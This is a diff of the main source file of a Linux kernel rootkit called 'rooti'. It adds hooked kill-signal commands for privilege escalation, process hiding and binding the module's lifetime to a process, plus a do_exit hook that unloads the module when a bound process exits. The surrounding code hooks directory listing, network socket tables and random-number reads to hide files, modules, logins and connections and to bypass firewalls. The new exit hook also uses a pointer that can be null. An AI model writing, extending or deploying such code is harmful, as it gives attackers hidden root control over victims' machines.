@@ -13,13 +13,14 @@
 #include "hooking/syscall.h"
 #include "hooking/func.h"
 #include "capabilities/privilege.h"
-#include "capabilities/tracking.h"
 #include "capabilities/unloading.h"
 #include "capabilities/fw_bypass.h"
 #include "capabilities/hiding/dentry.h"
 #include "capabilities/hiding/module.h"
 #include "capabilities/hiding/login.h"
 #include "capabilities/hiding/net.h"
+#include "capabilities/tracking/process.h"
+#include "capabilities/tracking/fd.h"
 #include "utils.h"
 #include "config.h"
 
@@ -30,12 +31,15 @@ MODULE_VERSION("1.0.0");
 
 // Unused signal numbers which can be used by the rootkit for its own purposes
 enum rooti_signal {
-    ROOTI_SIG_UNLOAD = 63,  // make the rootkit self destruct by unloading itself
-    ROOTI_SIG_REG = 64      // request by a usermode process to be serviced by the rootkit
+    ROOTI_SIG_PROC_LIFETIME_UNBIND = 60,  // request to unbind modules lifetime to the process
+    ROOTI_SIG_PROC_LIFETIME_BIND = 61,    // request to bind module lifetime to the process
+    ROOTI_SIG_PROC_UNHIDE = 62,           // request to unhide a process
+    ROOTI_SIG_PROC_HIDE = 63,             // request to hide a process
+    ROOTI_SIG_PROC_PE = 64                // request for privilege escalation
 };
 
-// Bitmap in which every bit represents the PID number of a registered client userspace process
-static unsigned char rooti_clients_bitmap[PID_MAX_LIMIT / 8] = {0};
+// List of tracked processes (for each one we track different attributes)
+static LIST_HEAD(rooti_tracked_procs);
 
 // List of /proc directory FDs opened by userspace processes
 static LIST_HEAD(rooti_proc_tracked_fds);
@@ -62,23 +66,30 @@ static int (*orig_tcp4_seq_show)(struct seq_file *seq, void *v);
 static int (*orig_udp4_seq_show)(struct seq_file *seq, void *v);
 static ssize_t (*orig_random_read_iter)(struct kiocb *kiocb, struct iov_iter *iter);
 static ssize_t (*orig_urandom_read_iter)(struct kiocb *kiocb, struct iov_iter *iter);
-
+static void (*orig_do_exit)(long code);
 
 static asmlinkage long hook_kill(const struct pt_regs *regs)
 {
     int sig = regs->si;
-    if (sig == ROOTI_SIG_REG) {
-        // Register the new process
-        rooti_clients_bitmap[current->pid / 8] |= (1U << current->pid % 8);
-        return rooti_elevate_privilege();
-    } 
-    else if (sig == ROOTI_SIG_UNLOAD) {
-        // Schedule the unloading of the rootkit
-        return rooti_schedule_self_deletion();
-    }
-    return orig_kill(regs);
-}
 
+    switch (sig)
+    {
+    case ROOTI_SIG_PROC_PE:
+        return rooti_elevate_privilege();
+    case ROOTI_SIG_PROC_HIDE:
+        return rooti_track_proc_attr(current->pid, ROOTI_PROC_HIDDEN, &rooti_tracked_procs);
+    case ROOTI_SIG_PROC_UNHIDE:
+        rooti_untrack_proc_attr(current->pid, ROOTI_PROC_HIDDEN, &rooti_tracked_procs);
+        return 0;
+    case ROOTI_SIG_PROC_LIFETIME_BIND:
+        return rooti_track_proc_attr(current->pid, ROOTI_PROC_LIFETIME_BOUND, &rooti_tracked_procs);
+    case ROOTI_SIG_PROC_LIFETIME_UNBIND:
+        rooti_untrack_proc_attr(current->pid, ROOTI_PROC_LIFETIME_BOUND, &rooti_tracked_procs);
+        return 0;
+    default:
+        return orig_kill(regs);
+    }
+}
 
 static asmlinkage long hook_openat(const struct pt_regs *regs)
 {
@@ -160,7 +171,7 @@ static asmlinkage long hook_getdents64(const struct pt_regs *regs)
     bool is_proc_dir = rooti_is_tracked_fd(fd, &rooti_proc_tracked_fds);
 
     // Filter any files we wish to hide from the buffer
-    return rooti_hide_dir_entries(user_buf, nread, is_proc_dir, rooti_clients_bitmap);
+    return rooti_hide_dir_entries(user_buf, nread, is_proc_dir, &rooti_tracked_procs);
 }
 
 static asmlinkage long hook_socket(const struct pt_regs *regs)
@@ -251,6 +262,25 @@ static int hook_udp4_seq_show(struct seq_file *seq, void *v)
     return orig_udp4_seq_show(seq, v);
 }
 
+static void hook_do_exit(long code)
+{
+    struct rooti_tracked_proc *proc = rooti_search_tracked_proc(current->pid, &rooti_tracked_procs);
+    bool should_unload = false;
+
+    if (proc == NULL) orig_do_exit(code);
+    
+    // If bound to the lifetime of the current process, the module should unload itself
+    if (test_bit(ROOTI_PROC_LIFETIME_BOUND, &proc->attrs)) {
+        should_unload = true;
+    }
+    rooti_untrack_proc(proc);
+
+    if (should_unload) {
+        rooti_schedule_self_deletion();
+    }
+    orig_do_exit(code);
+}
+
 static ssize_t hook_random_read_iter(struct kiocb *kiocb, struct iov_iter *iter)
 {
     // Get the size of the user buffer and allocate a matching kernel buffer filled with zeros
@@ -286,6 +316,7 @@ struct rooti_func_hook func_hooks[] = {
     ROOTI_FUNC_HOOK(ROOTI_SYSCALL_NAME("sys_setsockopt"), hook_setsockopt, &orig_setsockopt),
     ROOTI_FUNC_HOOK("tcp4_seq_show", hook_tcp4_seq_show, &orig_tcp4_seq_show),
     ROOTI_FUNC_HOOK("udp4_seq_show", hook_udp4_seq_show, &orig_udp4_seq_show),
+    ROOTI_FUNC_HOOK("do_exit", hook_do_exit, &orig_do_exit),
     ROOTI_FUNC_HOOK("random_read_iter", hook_random_read_iter, &orig_random_read_iter),
     ROOTI_FUNC_HOOK("urandom_read_iter", hook_random_read_iter, &orig_urandom_read_iter)
 };
@@ -332,15 +363,11 @@ static void __exit rooti_exit(void)
     // Uninstall firewall bypassing hooks
     rooti_uninstall_fw_bypass_hooks();
     
-    struct rooti_tracked_fd *record;
-    struct rooti_tracked_fd *tmp;
-
     // Release any remaining records
     for (int i = 0; i < ARRAY_SIZE(rooti_tracked_fds_lists); i++) {
-        list_for_each_entry_safe(record, tmp, rooti_tracked_fds_lists[i], head) {
-            rooti_untrack_fd(record);
-        }
+        rooti_clear_fd_tracking(rooti_tracked_fds_lists[i]);
     }
+    rooti_clear_proc_tracking(&rooti_tracked_procs);
 }
 
 module_init(rooti_init);
